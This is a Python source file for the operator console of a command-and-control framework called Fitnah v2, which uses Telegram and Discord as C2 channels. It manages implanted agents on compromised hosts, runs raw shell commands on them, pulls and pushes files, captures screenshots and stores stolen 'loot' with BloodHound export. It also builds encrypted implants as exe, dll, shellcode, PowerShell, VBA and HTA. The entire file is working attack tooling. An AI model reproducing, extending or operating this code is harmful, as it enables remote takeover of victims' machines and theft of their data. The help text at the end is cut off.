"""
Fitnah v2 CLI — FuzzBunch-inspired operator REPL.

Prompt hierarchy:
  fitnah [project]>                        ← root
  fitnah [project • agent-001]>            ← session selected
  fitnah [project • agent-001 • dump_sam]> ← module loaded
"""
from __future__ import annotations

import asyncio
import shlex
import sys
import time
from pathlib import Path
from typing import TYPE_CHECKING

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.styles import Style

if TYPE_CHECKING:
    from fitnah.orchestration.kernel import Kernel
    from fitnah.orchestration.project import Project

# ── Banner ────────────────────────────────────────────────────────────────────

BANNER = """\033[91m
  ███████╗██╗████████╗███╗   ██╗ █████╗ ██╗  ██╗
  ██╔════╝██║╚══██╔══╝████╗  ██║██╔══██╗██║  ██║
  █████╗  ██║   ██║   ██╔██╗ ██║███████║███████║
  ██╔══╝  ██║   ██║   ██║╚██╗██║██╔══██║██╔══██║
  ██║     ██║   ██║   ██║ ╚████║██║  ██║██║  ██║
  ╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\033[0m  \033[90mv2.0\033[0m

  \033[90mTelegram C2  ·  Discord Fallback  ·  FuzzBunch-style CLI\033[0m
"""

# ── Prompt style ──────────────────────────────────────────────────────────────

_STYLE = Style.from_dict({
    "project": "#888888",
    "sep":     "#444444",
    "agent":   "#cc0000 bold",
    "module":  "#ff8800",
    "prompt":  "#ffffff bold",
})

# ── Console ───────────────────────────────────────────────────────────────────

class FitnahConsole:
    """
    Main operator CLI. Runs in a loop on the main thread while
    the kernel's async C2 loop runs in a background thread.
    """

    def __init__(self, kernel: "Kernel", project: "Project", loop: asyncio.AbstractEventLoop):
        self._kernel  = kernel
        self._project = project
        self._loop    = loop   # the kernel's event loop

        # context state
        self._active_agent:  str | None = None   # selected agent_id
        self._active_module: str | None = None   # loaded plugin name
        self._module_params: dict       = {}      # current module options

        # prompt_toolkit session
        self._history  = InMemoryHistory()
        self._pt: PromptSession | None = None

    # ── entry point ───────────────────────────────────────────────────────

    def run(self) -> None:
        print(BANNER)
        self._pt = PromptSession(
            history=self._history,
            auto_suggest=AutoSuggestFromHistory(),
            style=_STYLE,
        )
        with patch_stdout(raw=True):
            self._repl()

    def _repl(self) -> None:
        while True:
            try:
                raw = self._pt.prompt(
                    self._build_prompt(),
                    completer=self._build_completer(),
                ).strip()
            except KeyboardInterrupt:
                self._do_exit([])
                break
            except EOFError:
                # non-TTY stdin (piped/redirected) — fall back to plain input
                try:
                    raw = input().strip()
                except (EOFError, KeyboardInterrupt):
                    self._do_exit([])
                    break

            if not raw:
                continue

            try:
                parts = shlex.split(raw)
            except ValueError:
                parts = raw.split()

            cmd, *args = parts
            self._dispatch(cmd.lower(), args)

    # ── prompt builder ────────────────────────────────────────────────────

    def _build_prompt(self) -> HTML:
        proj  = self._project.name if self._project else "fitnah"
        parts = [f"<project>{proj}</project>"]
        if self._active_agent:
            parts.append(f"<sep> • </sep><agent>{self._active_agent}</agent>")
        if self._active_module:
            parts.append(f"<sep> • </sep><module>{self._active_module}</module>")
        inner = "".join(parts)
        return HTML(f"{inner}<prompt> > </prompt>")

    def _build_completer(self) -> WordCompleter:
        words = list(_COMMANDS.keys())
        if self._kernel:
            words += list(self._kernel.plugins.keys())
            words += [s.agent_id for s in self._kernel.sessions.all()]
        return WordCompleter(words, ignore_case=True)

    # ── command dispatcher ────────────────────────────────────────────────

    def _dispatch(self, cmd: str, args: list[str]) -> None:
        handler = _COMMANDS.get(cmd)
        if handler:
            try:
                handler(self, args)
            except Exception as exc:
                _err(f"Error in {cmd}: {exc}")
        else:
            _err(f"Unknown command: {cmd!r}  (type 'help')")

    # ── sessions ──────────────────────────────────────────────────────────

    def _do_sessions(self, args: list[str]) -> None:
        """sessions [-l] [-i <id>] [-k <id>]"""
        if "-i" in args:
            idx = args.index("-i")
            agent_id = args[idx + 1] if idx + 1 < len(args) else ""
            self._select_session(agent_id)
            return
        if "-k" in args:
            idx = args.index("-k")
            agent_id = args[idx + 1] if idx + 1 < len(args) else ""
            self._kill_session(agent_id)
            return
        print(self._kernel.sessions.table())

    def _select_session(self, agent_id: str) -> None:
        s = self._kernel.sessions.get(agent_id)
        if not s:
            _err(f"No session: {agent_id!r}")
            return
        self._active_agent  = agent_id
        self._active_module = None
        self._module_params = {}
        _ok(f"Active target → {s.hostname} ({agent_id})")

    def _kill_session(self, agent_id: str) -> None:
        s = self._kernel.sessions.get(agent_id)
        if not s:
            _err(f"No session: {agent_id!r}")
            return
        confirm = input(f"  Kill {s.hostname} ({agent_id})? [y/N] ").strip().lower()
        if confirm != "y":
            _info("Cancelled.")
            return
        result = self._run_async(
            self._kernel.c2.dispatch(agent_id, s.group_id or agent_id, "die")
        )
        self._kernel.sessions.remove(agent_id)
        if self._active_agent == agent_id:
            self._active_agent  = None
            self._active_module = None
        _ok(f"Session {agent_id} killed.")

    # ── use / back ────────────────────────────────────────────────────────

    def _do_use(self, args: list[str]) -> None:
        """use <plugin_name>  or  use <agent_id>"""
        if not args:
            _err("Usage: use <plugin>  or  use <agent_id>")
            return
        name = args[0]

        # check if it's an agent_id first
        if self._kernel.sessions.get(name):
            self._select_session(name)
            return

        # otherwise treat as plugin
        plugin = self._kernel.plugins.get(name)
        if not plugin:
            _err(f"Plugin not found: {name!r}  (try: search {name})")
            return
        self._active_module = name
        self._module_params = {
            p.name: (p.default if not p.required else "")
            for p in plugin.schema.params
        }
        print(plugin.help_text())

    def _do_back(self, args: list[str]) -> None:
        if self._active_module:
            self._active_module = None
            self._module_params = {}
        elif self._active_agent:
            self._active_agent  = None
        else:
            _info("Already at root.")

    # ── options / set / run ───────────────────────────────────────────────

    def _do_options(self, args: list[str]) -> None:
        if not self._active_module:
            _err("No module loaded. Use: use <plugin>")
            return
        plugin = self._kernel.plugins.get(self._active_module)
        if not plugin:
            return
        print(f"\n  Module: {self._active_module}\n")
        print(f"  {'NAME':<20} {'VALUE':<20} REQUIRED   DESCRIPTION")
        print(f"  {'─'*20} {'─'*20} {'─'*9}  {'─'*30}")
        for p in plugin.schema.params:
            val = self._module_params.get(p.name, p.default)
            req = "yes" if p.required else "no"
            print(f"  {p.name:<20} {str(val):<20} {req:<10} {p.help}")
        print()

    def _do_set(self, args: list[str]) -> None:
        """set <KEY> <value>"""
        if len(args) < 2:
            _err("Usage: set <KEY> <value>")
            return
        if not self._active_module:
            _err("No module loaded. Use: use <plugin>")
            return
        key, val = args[0], " ".join(args[1:])
        plugin = self._kernel.plugins.get(self._active_module)
        if plugin:
            param = next((p for p in plugin.schema.params if p.name == key), None)
            if not param:
                _err(f"Unknown option: {key}")
                return
        self._module_params[key] = val
        _ok(f"{key} => {val}")

    def _do_run(self, args: list[str]) -> None:
        """run  (uses active session and module)"""
        # parse -s <agent_id> override
        agent_id = self._active_agent
        if "-s" in args:
            idx = args.index("-s")
            agent_id = args[idx + 1] if idx + 1 < len(args) else agent_id

        if not self._active_module:
            _err("No module loaded. Use: use <plugin>")
            return

        # Check whether this plugin requires a live session (ctx-dependent)
        plugin = self._kernel.plugins.get(self._active_module)
        _offline_categories = {"initial_access"}
        needs_session = (
            plugin is None
            or getattr(plugin, "CATEGORY", "") not in _offline_categories
        )

        if needs_session and not agent_id:
            _err("No session selected. Use: sessions -i <id>  (or pick an offline plugin)")
            return

        if agent_id:
            session = self._kernel.sessions.get(agent_id)
            if not session:
                _err(f"Session not found: {agent_id}")
                return

        _info(f"Running {self._active_module} against {session.hostname}...")
        result = self._run_async(
            self._kernel.execute(agent_id, self._active_module, self._module_params)
        )

        icon = "[+]" if result else "[-]"
        print(f"\n  {icon} Status : {result.status.value}")
        if result.error:
            print(f"  [-] Error  : {result.error}")
        if result.data:
            _print_data(result.data)
        if result.metadata.get("loot_id"):
            _ok(f"Saved to loot #{result.metadata['loot_id']}")
        print()

    # ── shell ─────────────────────────────────────────────────────────────

    def _do_shell(self, args: list[str]) -> None:
        """shell <command>  — execute a raw shell command on the active session"""
        if not self._active_agent:
            _err("No session selected.")
            return
        if not args:
            _err("Usage: shell <command>")
            return
        cmd = " ".join(args)
        session = self._kernel.sessions.get(self._active_agent)
        _info(f"Executing: {cmd}")
        result = self._run_async(
            self._kernel.c2.dispatch(
                self._active_agent,
                session.group_id or self._active_agent,
                "exec",
                {"cmd": cmd},
            )
        )
        output = result.get("output", "")
        status = result.get("status", "?")
        print(f"\n  {'[+]' if status=='ok' else '[-]'} {output}\n")
        session.touch(f"shell:{cmd[:30]}", status)

    # ── search ────────────────────────────────────────────────────────────

    def _do_search(self, args: list[str]) -> None:
        """search <keyword>"""
        if not args:
            _err("Usage: search <keyword>")
            return
        query   = " ".join(args)
        results = self._kernel.search_plugins(query)
        if not results:
            _info(f"No plugins matched: {query!r}")
            return
        print(f"\n  {'NAME':<25} {'CATEGORY':<22} {'MITRE':<12} DESCRIPTION")
        print(f"  {'─'*25} {'─'*22} {'─'*12} {'─'*35}")
        for p in sorted(results, key=lambda x: x.CATEGORY):
            print(f"  {p.NAME:<25} {p.CATEGORY:<22} {(p.MITRE or '—'):<12} {p.DESCRIPTION[:35]}")
        print()

    # ── info ──────────────────────────────────────────────────────────────

    def _do_info(self, args: list[str]) -> None:
        """info <plugin>"""
        name   = args[0] if args else self._active_module
        if not name:
            _err("Usage: info <plugin>")
            return
        plugin = self._kernel.plugins.get(name)
        if not plugin:
            _err(f"Plugin not found: {name!r}")
            return
        print("\n" + plugin.help_text())

    # ── history ───────────────────────────────────────────────────────────

    def _do_history(self, args: list[str]) -> None:
        """history [agent_id]"""
        agent_id = args[0] if args else self._active_agent
        if not agent_id:
            _err("No session selected.")
            return
        session = self._kernel.sessions.get(agent_id)
        if not session:
            _err(f"No session: {agent_id!r}")
            return
        entries = session.history(30)
        if not entries:
            _info("No actions recorded.")
            return
        print(f"\n  History — {session.hostname} ({agent_id})")
        print(f"  {'TIME':<10} {'ACTION':<35} RESULT")
        print(f"  {'─'*10} {'─'*35} {'─'*8}")
        for e in entries:
            icon = "✓" if e.get("result") == "ok" else "✗"
            print(f"  {e['time']:<10} {e['action']:<35} {icon} {e.get('result','')}")
        print()

    # ── loot ──────────────────────────────────────────────────────────────

    def _do_loot(self, args: list[str]) -> None:
        """
        loot                         — list recent entries
        loot -q <keyword>            — keyword search (label/tags)
        loot -t <type>               — filter by kind
        loot -a <agent_id>           — filter by agent
        loot -d <id>                 — dump raw data for entry
        loot -x <id>                 — delete entry
        loot --export text|csv|bh    — export all (filtered) results
        loot --out <path>            — write export to file
        """
        loot = self._kernel.loot

        # ── dump raw data
        if "-d" in args:
            idx     = args.index("-d")
            loot_id = int(args[idx + 1]) if idx + 1 < len(args) else 0
            data    = loot.get_data(loot_id)
            if data:
                print(data.decode(errors="replace"))
            else:
                _err(f"Loot #{loot_id} not found.")
            return

        # ── delete
        if "-x" in args:
            idx     = args.index("-x")
            loot_id = int(args[idx + 1]) if idx + 1 < len(args) else 0
            if loot.delete(loot_id):
                _ok(f"Loot #{loot_id} deleted.")
            else:
                _err(f"Loot #{loot_id} not found.")
            return

        # ── parse filters
        kind     = None
        agent_id = None
        query    = ""
        export   = None
        out_path = None

        def _arg_val(flag: str) -> str | None:
            if flag in args:
                i = args.index(flag)
                return args[i + 1] if i + 1 < len(args) else None
            return None

        kind     = _arg_val("-t")
        agent_id = _arg_val("-a")
        query    = _arg_val("-q") or ""
        export   = _arg_val("--export")
        out_path = _arg_val("--out")

        rows = loot.full_search(query=query, agent_id=agent_id, kind=kind, limit=200)

        # ── export mode
        if export:
            if export == "csv":
                content = loot.export_csv(rows)
                label   = "CSV"
            elif export in ("bh", "bloodhound"):
                content = loot.export_bloodhound(rows)
                label   = "BloodHound JSON"
            else:
                content = loot.export_text(rows)
                label   = "text"

            if out_path:
                from pathlib import Path as _P
                loot.save_export(content, _P(out_path))
                _ok(f"Exported {len(rows)} entries as {label} → {out_path}")
            else:
                print(content)
            return

        # ── default: table view
        if not rows:
            _info("No loot entries.")
            return

        print(f"\n  {'ID':<6} {'TIME':<19} {'AGENT':<14} {'KIND':<18} LABEL")
        print(f"  {'─'*6} {'─'*19} {'─'*14} {'─'*18} {'─'*25}")
        for r in rows[:50]:
            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r["ts"]))
            print(f"  {r['id']:<6} {ts}  {r['agent_id'][:12]:<14} {r['kind']:<18} {r['label']}")
        if len(rows) > 50:
            _info(f"  … {len(rows) - 50} more. Use --export to see all.")
        print()

    # ── builder ───────────────────────────────────────────────────────────

    def _do_builder(self, args: list[str]) -> None:
        """
        builder -f <format> -a <agent_id> [options]

        Formats : exe | dll | shellcode | ps1 | vba | hta
        Options:
          -f <fmt>       Output format (default: ps1)
          -a <agent_id>  Agent ID to bake in (default: active session)
          --arch x64|x86 CPU architecture (default: x64)
          --sleep <n>    Beacon sleep seconds (default: 5)
          --jitter <n>   Jitter % (default: 20)
          --encrypt none|xor|aes-256-gcm  (default: aes-256-gcm for exe/shellcode)
          --out <name>   Output filename (auto-generated if omitted)
          --list         List recent builds
        """
        from fitnah.builder.engine import BuildEngine
        from fitnah.builder.models import (
            Arch, BuildRequest, Encrypt, OutputFormat,
        )

        if "--list" in args:
            self._builder_list()
            return

        def _val(flag: str, default: str = "") -> str:
            if flag in args:
                i = args.index(flag)
                return args[i + 1] if i + 1 < len(args) else default
            return default

        fmt_str   = _val("-f",        "ps1")
        agent_id  = _val("-a",        self._active_agent or "")
        arch_str  = _val("--arch",    "x64")
        sleep_s   = int(_val("--sleep",   "5"))
        jitter_p  = int(_val("--jitter",  "20"))
        enc_str   = _val("--encrypt", "")
        out_name  = _val("--out",     "")

        if not agent_id:
            _err("No agent ID. Use: builder -a <agent_id>  or  select a session first.")
            return

        # resolve bot token from config
        try:
            bot_token = self._kernel.cfg.telegram_token
        except Exception:
            _err("Cannot read telegram token from config.")
            return

        # resolve chat_id from session if available
        session = self._kernel.sessions.get(agent_id) if self._kernel else None
        chat_id = session.group_id if (session and session.group_id) else agent_id

        # parse enums
        try:
            fmt = OutputFormat(fmt_str.lower())
        except ValueError:
            _err(f"Unknown format: {fmt_str!r}. Choose: exe dll shellcode ps1 vba hta")
            return

        try:
            arch = Arch(arch_str.lower())
        except ValueError:
            _err(f"Unknown arch: {arch_str!r}. Choose: x64 x86")
            return

        # default encryption: aes-256-gcm for binary formats, none for scripts
        if not enc_str:
            enc_str = "aes-256-gcm" if fmt in (OutputFormat.EXE, OutputFormat.DLL, OutputFormat.SHELLCODE) else "none"
        try:
            encrypt = Encrypt(enc_str.lower())
        except ValueError:
            _err(f"Unknown encrypt: {enc_str!r}. Choose: none xor aes-256-gcm")
            return

        req = BuildRequest(
            bot_token=bot_token,
            chat_id=chat_id,
            agent_id=agent_id,
            sleep=sleep_s,
            jitter=jitter_p,
            format=fmt,
            arch=arch,
            encrypt=encrypt,
            output_dir=self._kernel.cfg.get("builder", "output_dir", default="build"),
            output_name=out_name,
        )

        _info(f"Building {fmt.value} for agent {agent_id} ({arch.value}) ...")
        engine = BuildEngine(req.output_dir)
        result = engine.build(req)

        if result.ok:
            _ok(result.summary())
            for w in result.warnings:
                _info(f"WARN: {w}")
        else:
            _err(f"Build failed: {result.error}")
            for line in result.build_log[-10:]:
                print(f"       {line}")

    def _builder_list(self) -> None:
        """List files in the build output directory."""
        import os
        build_dir = self._kernel.cfg.get("builder", "output_dir", default="build") if self._kernel else "build"
        p = Path(build_dir)
        if not p.exists() or not list(p.iterdir()):
            _info("No builds yet.")
            return
        print(f"\n  Builds in {p.resolve()}")
        print(f"  {'NAME':<40} {'SIZE':>10}  MODIFIED")
        print(f"  {'─'*40} {'─'*10}  {'─'*19}")
        entries = sorted(p.iterdir(), key=lambda f: f.stat().st_mtime, reverse=True)
        for f in entries:
            if f.is_file():
                st  = f.stat()
                ts  = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime))
                print(f"  {f.name:<40} {st.st_size:>10,}  {ts}")
        print()

    # ── listeners ─────────────────────────────────────────────────────────

    def _do_listeners(self, args: list[str]) -> None:
        """listeners [failover|recover]"""
        if "failover" in args:
            ok = self._run_async(self._kernel.router.force_failover("discord"))
            _ok("Forced to Discord.") if ok else _err("Discord not available.")
            return
        if "recover" in args:
            ok = self._run_async(self._kernel.router.force_recover())
            _ok("Recovered to Telegram.") if ok else _err("Telegram not available.")
            return
        print(self._kernel.router.status_table())

    # ── project ───────────────────────────────────────────────────────────

    def _do_project(self, args: list[str]) -> None:
        """project info | project list"""
        sub = args[0] if args else "info"
        if sub == "info":
            if self._project:
                print("\n" + self._project.summary())
            else:
                _info("No project active.")
        elif sub == "list":
            from fitnah.orchestration.project import Project
            projs = Project.list_all()
            if not projs:
                _info("No projects found.")
            else:
                print(f"\n  {'NAME':<25} {'OPERATOR':<15} CREATED")
                print(f"  {'─'*25} {'─'*15} {'─'*19}")
                for p in projs:
                    ts = time.strftime(
                        "%Y-%m-%d %H:%M", time.localtime(p.get("created_at", 0))
                    )
                    print(f"  {p['name']:<25} {p['operator']:<15} {ts}")
                print()
        else:
            _err(f"Unknown sub-command: {sub}")

    # ── audit ─────────────────────────────────────────────────────────────

    def _do_audit(self, args: list[str]) -> None:
        """audit [n]  — show last N audit entries"""
        n       = int(args[0]) if args and args[0].isdigit() else 20
        entries = self._kernel.audit.tail(n)
        print(self._kernel.audit.display(entries))

    # ── status ────────────────────────────────────────────────────────────

    def _do_status(self, args: list[str]) -> None:
        """status — show server and transport status"""
        print("\n" + self._kernel.status() + "\n")

    # ── plugins list ──────────────────────────────────────────────────────

    def _do_plugins(self, args: list[str]) -> None:
        """plugins [category] — list all loaded plugins, optionally filtered by category"""
        category = args[0] if args else ""
        entries  = self._kernel.list_plugins(category=category)
        if not entries:
            _info(f"No plugins{' in category ' + category if category else ''} loaded.")
            return
        print(f"\n  {'NAME':<25} {'CATEGORY':<22} {'MITRE':<12} DESCRIPTION")
        print(f"  {'─'*25} {'─'*22} {'─'*12} {'─'*35}")
        for p in entries:
            print(
                f"  {p['name']:<25} {p['category']:<22} "
                f"{(p['mitre'] or '—'):<12} {p['description'][:35]}"
            )
        print(f"\n  Total: {len(entries)} plugin(s)\n")

    # ── install / uninstall ───────────────────────────────────────────────

    def _do_install(self, args: list[str]) -> None:
        """install <path_or_url>  — install a plugin from a .py file or URL"""
        if not args:
            _err("Usage: install <path_or_url>")
            return
        path_or_url = args[0]
        try:
            name = self._kernel.install_plugin(path_or_url)
            _ok(f"Plugin installed: {name!r}  ({len(self._kernel.plugins)} total)")
        except Exception as exc:
            _err(f"Install failed: {exc}")

    def _do_uninstall(self, args: list[str]) -> None:
        """uninstall <name>  — remove a plugin by name"""
        if not args:
            _err("Usage: uninstall <name>")
            return
        name = args[0]
        ok = self._kernel.uninstall_plugin(name)
        if ok:
            _ok(f"Plugin {name!r} uninstalled.")
        else:
            _err(f"Plugin {name!r} not found.")

    # ── download / upload ────────────────────────────────────────────────

    def _do_download(self, args: list[str]) -> None:
        """download <agent_id> <remote_path>  — pull a file from the agent"""
        if len(args) < 2:
            _err("Usage: download <agent_id> <remote_path>")
            return
        agent_id    = args[0]
        remote_path = " ".join(args[1:])
        session = self._kernel.sessions.get(agent_id)
        if not session:
            _err(f"Session not found: {agent_id}")
            return

        _info(f"Downloading {remote_path} from {session.hostname}...")
        result = self._run_async(
            self._kernel.c2.dispatch(
                agent_id=agent_id,
                chat_id=session.group_id or agent_id,
                command="download",
                args={"path": remote_path},
            )
        )
        if not result or result.get("status") != "ok":
            _err(f"Download failed: {result.get('output', 'unknown') if result else 'no response'}")
            return

        raw = result.get("bytes") or result.get("output", b"")
        if isinstance(raw, str):
            import base64 as _b64
            try:
                # fix missing padding before decode
                padded = raw + "=" * (-len(raw) % 4)
                raw = _b64.b64decode(padded)
            except Exception:
                raw = raw.encode("utf-8", errors="replace")

        dl_dir = Path("downloads")
        dl_dir.mkdir(exist_ok=True)
        fname   = remote_path.replace("\\", "/").rstrip("/").split("/")[-1]
        ts_str  = time.strftime("%Y%m%d_%H%M%S")
        out     = dl_dir / f"{ts_str}_{fname}"
        out.write_bytes(raw if isinstance(raw, bytes) else str(raw).encode())
        _ok(f"Saved {len(raw) if isinstance(raw, bytes) else '?'} bytes → {out}")

    def _do_upload(self, args: list[str]) -> None:
        """upload <agent_id> <local_path> [remote_path]  — push a file to the agent"""
        if len(args) < 2:
            _err("Usage: upload <agent_id> <local_path> [remote_path]")
            return
        agent_id   = args[0]
        local_path = args[1]
        session = self._kernel.sessions.get(agent_id)
        if not session:
            _err(f"Session not found: {agent_id}")
            return

        src = Path(local_path)
        if not src.exists():
            _err(f"Local file not found: {src}")
            return

        remote_path = args[2] if len(args) > 2 else f"C:\\Windows\\Temp\\{src.name}"
        import base64 as _b64
        data_b64 = _b64.b64encode(src.read_bytes()).decode()
        _info(f"Uploading {src} ({src.stat().st_size:,} bytes) → {session.hostname}:{remote_path}")

        result = self._run_async(
            self._kernel.c2.dispatch(
                agent_id=agent_id,
                chat_id=session.group_id or agent_id,
                command="upload",
                args={"path": remote_path, "data": data_b64},
            )
        )
        status = result.get("status", "?") if result else "no response"
        if status == "ok":
            _ok(f"Upload complete → {remote_path}")
        else:
            _err(f"Upload failed: {result.get('output', status) if result else 'no response'}")

    # ── screenshot shortcut ───────────────────────────────────────────────

    def _do_screenshot(self, args: list[str]) -> None:
        """screenshot [agent_id]  — capture screenshot and save locally"""
        agent_id = args[0] if args else self._active_agent
        if not agent_id:
            _err("No session selected. Usage: screenshot [agent_id]")
            return
        session = self._kernel.sessions.get(agent_id)
        if not session:
            _err(f"Session not found: {agent_id}")
            return

        _info(f"Capturing screenshot from {session.hostname}...")
        result = self._run_async(
            self._kernel.execute(agent_id, "screenshot", {})
        )
        if not result or result.error:
            _err(f"Screenshot failed: {result.error if result else 'no response'}")
            return

        data = result.data
        if not data:
            _err("No screenshot data returned.")
            return

        ss_dir = Path("screenshots")
        ss_dir.mkdir(exist_ok=True)
        ts_str  = time.strftime("%Y%m%d_%H%M%S")
        out     = ss_dir / f"{ts_str}_{session.hostname}.png"
        if isinstance(data, bytes):
            out.write_bytes(data)
        else:
            import base64 as _b64
            try:
                out.write_bytes(_b64.b64decode(data))
            except Exception:
                out.write_text(str(data))
        _ok(f"Screenshot saved → {out}")

    # ── sessions rich table ───────────────────────────────────────────────

    def _do_agents(self, args: list[str]) -> None:
        """agents  — rich table of all active agents"""
        sessions = self._kernel.sessions.alive()
        if not sessions:
            _info("No active agents.")
            return
        now = time.time()
        print(f"\n  {'AGENT_ID':<16} {'HOSTNAME':<20} {'IP':<16} {'OS':<14} {'PRIV':<10} {'LAST_SEEN'}")
        print(f"  {'─'*16} {'─'*20} {'─'*16} {'─'*14} {'─'*10} {'─'*12}")
        for s in sorted(sessions, key=lambda x: x.agent_id):
            age = int(now - s.last_seen) if hasattr(s, "last_seen") and s.last_seen else 0
            age_str = f"{age}s ago"
            print(
                f"  {s.agent_id:<16} {s.hostname:<20} {s.ip:<16} "
                f"{s.os[:12]:<14} {s.priv_level:<10} {age_str}"
            )
        print(f"\n  {len(sessions)} active agent(s)\n")

    # ── reload ────────────────────────────────────────────────────────────

    def _do_reload(self, args: list[str]) -> None:
        """reload — hot-reload all plugins"""
        n = self._kernel.reload_plugins()
        _ok(f"Reloaded {n} plugin(s).")

    # ── help ──────────────────────────────────────────────────────────────

    def _do_help(self, args: list[str]) -> None:
        print(_HELP_TEXT)

    # ── exit ──────────────────────────────────────────────────────────────

    def _do_exit(self, args: list[str]) -> None:
        _info("Exiting Fitnah. Stay quiet.")
        sys.exit(0)

    # ── scheduler ─────────────────────────────────────────────────────────

    def _do_schedule(self, args: list[str]) -> None:
        """schedule <plugin> <interval_seconds> [agent_id]  — add recurring schedule"""
        if len(args) < 2:
            _err("Usage: schedule <plugin_name> <interval_seconds> [agent_id]")
            return
        plugin_name = args[0]
        try:
            interval = int(args[1])
        except ValueError:
            _err("interval_seconds must be an integer")
            return
        agent_id = args[2] if len(args) > 2 else self._active_agent
        if not agent_id:
            _err("No session selected. Specify agent_id or use 'use <agent>'")
            return
        if plugin_name not in self._kernel.plugins:
            _err(f"Plugin not found: {plugin_name}")
            return
        sid = self._kernel.scheduler.add(agent_id, plugin_name, {}, interval)
        _ok(f"Schedule created: {sid}  ({plugin_name} every {interval}s on {agent_id})")

    def _do_unschedule(self, args: list[str]) -> None:
        """unschedule <schedule_id>  — remove a schedule"""
        if not args:
            _err("Usage: unschedule <schedule_id>")
            return
        if self._kernel.scheduler.remove(args[0]):
            _ok(f"Schedule removed: {args[0]}")
        else:
            _err(f"Schedule not found: {args[0]}")

    def _do_schedules(self, args: list[str]) -> None:
        """schedules  — list all active schedules"""
        print(self._kernel.scheduler.summary_table())

    # ── profile ───────────────────────────────────────────────────────────

    def _do_profile(self, args: list[str]) -> None:
        """
        profile list                — list available C2 profiles
        profile set <name>          — hot-swap active C2 profile
        profile info [name]         — show profile details
        """
        from fitnah.c2.profiles import ProfileManager
        mgr = ProfileManager()

        sub = args[0] if args else "list"

        if sub == "list":
            names = mgr.list()
            print(f"\n  Available C2 profiles:")
            for n in names:
                p = mgr.get(n)
                mark = ""
                if self._kernel._http and getattr(self._kernel._http, "_profile", None):
                    if self._kernel._http._profile.name == n:
                        mark = "  <-- active"
                print(f"  {n:<20} {p.checkin_uri}{mark}")
            print()

        elif sub == "set":
            if len(args) < 2:
                _err("Usage: profile set <name>")
                return
            name = args[1]
            p = mgr.get(name)
            if p is None:
                _err(f"Unknown profile: {name!r}. Use 'profile list' to see options.")
                return
            if not self._kernel._http:
                _err("HTTP listener is not running — profile only applies to HTTP transport.")
                return
            self._kernel._http._profile = p
            # also update implant agent if present
            if hasattr(self._kernel, "_implant") and self._kernel._implant:
                self._kernel._implant._profile = p
            _ok(f"C2 profile switched to: {name}  ({p.checkin_uri})")

        elif sub == "info":
            name = args[1] if len(args) > 1 else (
                self._kernel._http._profile.name
                if (self._kernel._http and getattr(self._kernel._http, "_profile", None))
                else ""
            )
            if not name:
                _err("Usage: profile info <name>")
                return
            p = mgr.get(name)
            if p is None:
                _err(f"Unknown profile: {name!r}")
                return
            print(f"\n  Profile      : {p.name}")
            print(f"  Checkin URI  : {p.checkin_uri}")
            print(f"  ACK URI      : {p.ack_uri}")
            print(f"  User-Agent   : {p.user_agent}")
            print(f"  Extra Headers: {p.headers}")
            print(f"  URI Params   : {p.uri_params}")
            print()
        else:
            _err(f"Unknown sub-command: {sub}. Use: list | set <name> | info [name]")

    # ── audit verify ──────────────────────────────────────────────────────

    def _do_audit_verify(self, args: list[str]) -> None:
        """audit-verify  — check HMAC integrity of every audit log entry"""
        ok_cnt, bad_cnt = self._kernel.audit.verify()
        total = ok_cnt + bad_cnt
        if bad_cnt == 0:
            _ok(f"Audit log integrity OK — {total} entries verified.")
        else:
            _err(f"TAMPERED entries detected: {bad_cnt}/{total}  (ok={ok_cnt})")

    # ── async bridge ─────────────────────────────────────────────────────

    def _run_async(self, coro):
        """Run a coroutine on the kernel's event loop from this sync context."""
        future = asyncio.run_coroutine_threadsafe(coro, self._loop)
        try:
            return future.result(timeout=self._kernel.cfg.task_timeout + 5)
        except Exception as exc:
            _err(f"Async error: {exc}")
            return None


# ── Command registry ──────────────────────────────────────────────────────────

_COMMANDS: dict[str, callable] = {
    "sessions":   FitnahConsole._do_sessions,
    "agents":     FitnahConsole._do_agents,
    "use":        FitnahConsole._do_use,
    "back":       FitnahConsole._do_back,
    "options":    FitnahConsole._do_options,
    "set":        FitnahConsole._do_set,
    "run":        FitnahConsole._do_run,
    "shell":      FitnahConsole._do_shell,
    "search":     FitnahConsole._do_search,
    "info":       FitnahConsole._do_info,
    "history":    FitnahConsole._do_history,
    "loot":       FitnahConsole._do_loot,
    "builder":    FitnahConsole._do_builder,
    "listeners":  FitnahConsole._do_listeners,
    "project":    FitnahConsole._do_project,
    "audit":      FitnahConsole._do_audit,
    "status":     FitnahConsole._do_status,
    "plugins":    FitnahConsole._do_plugins,
    "install":    FitnahConsole._do_install,
    "uninstall":  FitnahConsole._do_uninstall,
    "download":   FitnahConsole._do_download,
    "upload":     FitnahConsole._do_upload,
    "screenshot": FitnahConsole._do_screenshot,
    "reload":     FitnahConsole._do_reload,
    "schedule":     FitnahConsole._do_schedule,
    "unschedule":   FitnahConsole._do_unschedule,
    "schedules":    FitnahConsole._do_schedules,
    "profile":      FitnahConsole._do_profile,
    "audit-verify": FitnahConsole._do_audit_verify,
    "help":         FitnahConsole._do_help,
    "exit":         FitnahConsole._do_exit,
    "quit":         FitnahConsole._do_exit,
}

_HELP_TEXT = """
  SESSIONS
  ────────────────────────────────────────────────────────────
  sessions                    List all agents
  sessions -i <id>            Select (interact with) an agent
  sessions -k <id>            Kill an agent
  agents                      Rich table: agent_id, hostname, IP, OS, priv, last_seen
  use <agent_id>              Select agent (shortcut)

  MODULES
  ────────────────────────────────────────────────────────────
  use <plugin>                Load a plugin module
  options                     Show current module options
  set <KEY> <value>           Set a module option
  run                         Execute module against active target
  run -s <agent_id>           Execute against a specific agent
  back                        Exit current module / deselect agent
  info <plugin>               Show plugin details
  search <keyword>            Search plugins by name/MITRE/tag
  plugins [category]          List all loaded plugins (optional category filter)
  install <path|url>          Install a plugin from a .py file or URL
  uninstall <name>            Remove a plugin by name
  reload                      Hot-reload all plugins

  FILES
  ────────────────────────────────────────────────────────────
  download <id> <remote_path>           Pull a file from agent → downloads/
  upload <id> <local_path> [remote]     Push a file to agent
  screenshot [agent_id]                 Capture screenshot → screenshots/

